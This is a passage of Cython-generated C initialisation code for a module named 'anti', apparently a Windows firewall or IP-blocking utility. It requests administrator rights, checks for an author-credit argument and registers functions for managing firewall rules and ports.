    PyObject* __pyx_t_24 = NULL;
    PyObject* __pyx_t_25 = NULL;
    PyObject* __pyx_t_26 = NULL;
    PyObject* __pyx_t_27 = NULL;
    PyObject* __pyx_t_28 = NULL;
    PyObject* __pyx_t_29 = NULL;
    PyObject* (*__pyx_t_30)(PyObject*);
    Py_ssize_t __pyx_t_31;
    PyObject* (*__pyx_t_32)(PyObject*);
    int __pyx_t_33;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannyDeclarations
#if CYTHON_PEP489_MULTI_PHASE_INIT
        if (__pyx_m) {
            if (__pyx_m == __pyx_pyinit_module) return 0;
            PyErr_SetString(PyExc_RuntimeError, "Module 'anti' has already been imported. Re-initialisation is not supported.");
            return -1;
        }
#elif PY_MAJOR_VERSION >= 3
        if (__pyx_m) return __Pyx_NewRef(__pyx_m);
#endif
#if CYTHON_REFNANNY
    __Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
    if (!__Pyx_RefNanny) {
        PyErr_Clear();
        __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
        if (!__Pyx_RefNanny)
            Py_FatalError("failed to import 'refnanny' module");
    }
#endif
    __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_anti(void)", 0);
    if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
#ifdef __Pxy_PyFrame_Initialize_Offsets
        __Pxy_PyFrame_Initialize_Offsets();
#endif
    __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
        __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
        __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
#ifdef __Pyx_CyFunction_USED
        if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
#endif
#ifdef __Pyx_FusedFunction_USED
            if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
#endif
#ifdef __Pyx_Coroutine_USED
                if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
#endif
#ifdef __Pyx_Generator_USED
                    if (__pyx_Generator_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
#endif
#ifdef __Pyx_AsyncGen_USED
                        if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
#endif
#ifdef __Pyx_StopAsyncIteration_USED
                            if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
#endif
#if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
                                PyEval_InitThreads();
#endif
#if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_m = __pyx_pyinit_module;
    Py_INCREF(__pyx_m);
#else
#if PY_MAJOR_VERSION < 3
    __pyx_m = Py_InitModule4("anti", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
#else
    __pyx_m = PyModule_Create(&__pyx_moduledef);
#endif
    if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
#endif
        __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
        Py_INCREF(__pyx_d);
    __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
        Py_INCREF(__pyx_b);
    __pyx_cython_runtime = PyImport_AddModule((char*)"cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
        Py_INCREF(__pyx_cython_runtime);
    if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
    if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
#if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
        if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
#endif
            if (__pyx_module_is_main_anti) {
                if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
            }
#if PY_MAJOR_VERSION >= 3
    {
        PyObject* modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
            if (!PyDict_GetItemString(modules, "anti")) {
                if (unlikely(PyDict_SetItemString(modules, "anti", __pyx_m) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
            }
    }
#endif
    if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
        if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
            (void)__Pyx_modinit_global_init_code();
    (void)__Pyx_modinit_variable_export_code();
    (void)__Pyx_modinit_function_export_code();
    (void)__Pyx_modinit_type_init_code();
    (void)__Pyx_modinit_type_import_code();
    (void)__Pyx_modinit_variable_import_code();
    (void)__Pyx_modinit_function_import_code();
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
#endif
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_name); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_n_u_main, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (__pyx_t_2) {
        __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_1is_admin, 0, __pyx_n_s_is_admin, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__28)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_is_admin, __pyx_t_1) < 0) __PYX_ERR(0, 2, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_Import(__pyx_n_s_ctypes, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_ctypes, __pyx_t_1) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_is_admin); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 8, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 8, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (__pyx_t_2) {
            goto __pyx_L3;
        } {
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_ctypes); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_windll); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_shell32); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_ShellExecuteW); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_executable); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_argv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = PyUnicode_Join(__pyx_kp_u__2, __pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = PyTuple_New(6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_INCREF(Py_None);
            __Pyx_GIVEREF(Py_None);
            PyTuple_SET_ITEM(__pyx_t_5, 0, Py_None);
            __Pyx_INCREF(__pyx_n_u_runas);
            __Pyx_GIVEREF(__pyx_n_u_runas);
            PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_u_runas);
            __Pyx_GIVEREF(__pyx_t_4);
            PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_4);
            __Pyx_GIVEREF(__pyx_t_3);
            PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_3);
            __Pyx_INCREF(Py_None);
            __Pyx_GIVEREF(Py_None);
            PyTuple_SET_ITEM(__pyx_t_5, 4, Py_None);
            __Pyx_INCREF(__pyx_int_1);
            __Pyx_GIVEREF(__pyx_int_1);
            PyTuple_SET_ITEM(__pyx_t_5, 5, __pyx_int_1);
            __pyx_t_4 = 0;
            __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_5, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 11, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 12, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_exit); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 12, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 12, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
    __pyx_L3:;
    {
        __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8); {
            if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_fb, __pyx_kp_u__7) < 0) __PYX_ERR(0, 14, __pyx_L4_error)
                __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 15, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_argv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 15, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (likely(PyList_CheckExact(__pyx_t_5)) || PyTuple_CheckExact(__pyx_t_5)) {
                __pyx_t_3 = __pyx_t_5; __Pyx_INCREF(__pyx_t_3); __pyx_t_9 = 0;
                __pyx_t_10 = NULL;
            }
            else {
                __pyx_t_9 = -1; __pyx_t_3 = PyObject_GetIter(__pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 15, __pyx_L4_error)
                    __Pyx_GOTREF(__pyx_t_3);
                __pyx_t_10 = Py_TYPE(__pyx_t_3)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 15, __pyx_L4_error)
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            for (;;) {
                if (likely(!__pyx_t_10)) {
                    if (likely(PyList_CheckExact(__pyx_t_3))) {
                        if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_3)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_5 = PyList_GET_ITEM(__pyx_t_3, __pyx_t_9); __Pyx_INCREF(__pyx_t_5); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 15, __pyx_L4_error)
#else
                        __pyx_t_5 = PySequence_ITEM(__pyx_t_3, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 15, __pyx_L4_error)
                            __Pyx_GOTREF(__pyx_t_5);
#endif
                    }
                    else {
                        if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_3)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_3, __pyx_t_9); __Pyx_INCREF(__pyx_t_5); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 15, __pyx_L4_error)
#else
                        __pyx_t_5 = PySequence_ITEM(__pyx_t_3, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 15, __pyx_L4_error)
                            __Pyx_GOTREF(__pyx_t_5);
#endif
                    }
                }
                else {
                    __pyx_t_5 = __pyx_t_10(__pyx_t_3);
                    if (unlikely(!__pyx_t_5)) {
                        PyObject* exc_type = PyErr_Occurred();
                        if (exc_type) {
                            if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                            else __PYX_ERR(0, 15, __pyx_L4_error)
                        }
                        break;
                    }
                    __Pyx_GOTREF(__pyx_t_5);
                }
                if (PyDict_SetItem(__pyx_d, __pyx_n_s_i, __pyx_t_5) < 0) __PYX_ERR(0, 15, __pyx_L4_error)
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_i); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 16, __pyx_L4_error)
                    __Pyx_GOTREF(__pyx_t_5);
                __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_5, __pyx_kp_u_https_fb_me_khanh10a1, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 16, __pyx_L4_error)
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                if (__pyx_t_2) {
                    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_i); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 17, __pyx_L4_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L4_error)
                        __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_fb, __pyx_t_1) < 0) __PYX_ERR(0, 17, __pyx_L4_error)
                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                }
            }
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_get_fb); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_3, __pyx_kp_u__7, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 18, __pyx_L4_error)
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (__pyx_t_2) {
                __pyx_t_3 = __Pyx_PyNumber_Int(__pyx_n_u_KhanhNguyen9872); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 19, __pyx_L4_error)
                    __Pyx_GOTREF(__pyx_t_3);
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            }
        }
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        goto __pyx_L9_try_end;
    __pyx_L4_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0; {
            __Pyx_AddTraceback("anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_5) < 0) __PYX_ERR(0, 20, __pyx_L6_except_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__29, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 21, __pyx_L6_except_error)
                __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_4); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 21, __pyx_L6_except_error)
                __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_fb, __pyx_t_11) < 0) __PYX_ERR(0, 21, __pyx_L6_except_error)
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            goto __pyx_L5_exception_handled;
        }
    __pyx_L6_except_error:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
        goto __pyx_L1_error;
    __pyx_L5_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
    __pyx_L9_try_end:;
    }
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_fb, __pyx_kp_u_https_fb_me_khanh10a1) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_get_fb); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 23, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_5, __pyx_kp_u_https_fb_me_khanh10a1, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 23, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (__pyx_t_2) {
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_3kill_process, 0, __pyx_n_s_kill_process, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__30)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 24, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_kill_process, __pyx_t_5) < 0) __PYX_ERR(0, 24, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_5clear, 0, __pyx_n_s_clear, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__31)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 31, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_clear, __pyx_t_5) < 0) __PYX_ERR(0, 31, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_7forward, 0, __pyx_n_s_forward, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__33)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 33, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_forward, __pyx_t_5) < 0) __PYX_ERR(0, 33, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_9block_ip, 0, __pyx_n_s_block_ip, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__35)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 58, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_block_ip, __pyx_t_5) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_11exec_sys, 0, __pyx_n_s_exec_sys, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__37)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 67, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_exec_sys, __pyx_t_5) < 0) __PYX_ERR(0, 67, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_13create_rule, 0, __pyx_n_s_create_rule, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__40)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 88, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_create_rule, __pyx_t_5) < 0) __PYX_ERR(0, 88, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_15add_ip_rule, 0, __pyx_n_s_add_ip_rule, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__42)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 99, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_add_ip_rule, __pyx_t_5) < 0) __PYX_ERR(0, 99, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_17open_port, 0, __pyx_n_s_open_port, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__44)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 103, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_open_port, __pyx_t_5) < 0) __PYX_ERR(0, 103, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_19about, 0, __pyx_n_s_about, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__46)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 162, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_about, __pyx_t_5) < 0) __PYX_ERR(0, 162, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_21remove_block, 0, __pyx_n_s_remove_block, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__48)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 174, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_remove_block, __pyx_t_5) < 0) __PYX_ERR(0, 174, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4anti_23start, 0, __pyx_n_s_start, NULL, __pyx_n_s_anti, __pyx_d, ((PyObject*)__pyx_codeobj__50)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 185, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_start, __pyx_t_5) < 0) __PYX_ERR(0, 185, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyList_New(5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_INCREF(__pyx_n_s_kill);
        __Pyx_GIVEREF(__pyx_n_s_kill);
        PyList_SET_ITEM(__pyx_t_5, 0, __pyx_n_s_kill);
        __Pyx_INCREF(__pyx_n_s_getpid);
        __Pyx_GIVEREF(__pyx_n_s_getpid);
        PyList_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_getpid);
        __Pyx_INCREF(__pyx_n_s_name_2);
        __Pyx_GIVEREF(__pyx_n_s_name_2);
        PyList_SET_ITEM(__pyx_t_5, 2, __pyx_n_s_name_2);
        __Pyx_INCREF(__pyx_n_s_system);
        __Pyx_GIVEREF(__pyx_n_s_system);
        PyList_SET_ITEM(__pyx_t_5, 3, __pyx_n_s_system);
        __Pyx_INCREF(__pyx_n_s_remove);
        __Pyx_GIVEREF(__pyx_n_s_remove);
        PyList_SET_ITEM(__pyx_t_5, 4, __pyx_n_s_remove);
        __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, __pyx_t_5, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 201, __pyx_L1_error)
